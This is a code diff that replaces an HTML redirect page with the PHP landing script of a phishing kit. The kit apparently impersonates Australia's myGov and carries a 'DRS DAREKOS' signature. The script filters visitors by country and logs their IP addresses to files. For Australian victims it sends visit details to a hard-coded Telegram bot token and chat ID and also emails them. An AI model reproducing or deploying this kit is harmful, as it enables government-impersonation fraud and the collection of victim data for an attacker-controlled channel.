@@ -1,9 +1,53 @@
-<!DOCTYPE html>
-<html>
-<head>
-   <meta http-equiv="refresh" 
-   content="0; url=https://10e5972.wcomhost.com">
-</head>
-<body>
-</body>
-</html>
+<?php
+
+        session_start();
+        error_reporting(0);
+
+
+		// █▓▒▒░░░🅳🆁🆂 ░░░▒▒▓█ //  𝖕𝖗𝖔𝖌𝖗𝖆𝖒𝖒𝖎𝖓𝖌 𝖇𝖞 𝖉𝖆𝖗𝖊𝖐𝖔𝖘✍  //
+
+        // 🖌 🇲🇦  ̷D̷̷R̷̷S̷ ̷D̷̷A̷̷R̷̷E̷̷K̷̷O̷̷S̷ ̷I̷̷S̷ ̷V̷̷1̷  🖌 
+
+
+
+	    require_once "bot.php";
+		require_once "action.php";
+
+        // 🖌 🇲🇦  ̷D̷̷R̷̷S̷ ̷D̷̷A̷̷R̷̷E̷̷K̷̷O̷̷S̷ ̷I̷̷S̷ ̷V̷̷1̷  🖌
+
+        if ($COUNTRY == "Australia") { 
+            echo ($red4);
+			
+	        $ip = getenv("REMOTE_ADDR");
+            $file = fopen("succe.txt","a");
+            fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
+			
+			
+            $message .= "ｖｕｓｉｔｏ𝓻 ₘyGₒᵥ: ".$ip."\n\n";
+            $message .= "COUNTRY: ".$COUNTRY."\n";
+            $message .= "TIME: ".$TIME."\n";
+		
+           ##  𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑨𝒑𝒊 // 🅳🆁🆂  𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑨𝒑𝒊 // ｖｕｓｉｔｏ𝓻 API
+		
+           $token = "5080000596:AAHdd5zZF3yoOT5-Hqa8bnurLIHdedqdETA";
+           $data = [
+           'text' => $message,
+           'chat_id' => '5006114121'
+           ];
+
+           file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
+           mail($send,$subject,$message,$headers);
+  
+           }else {
+			   
+
+           echo ($red3);
+
+	       $ip = getenv("REMOTE_ADDR");
+           $file = fopen("blacklist.txt","a");
+           fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
+
+           }
+
+?>
+
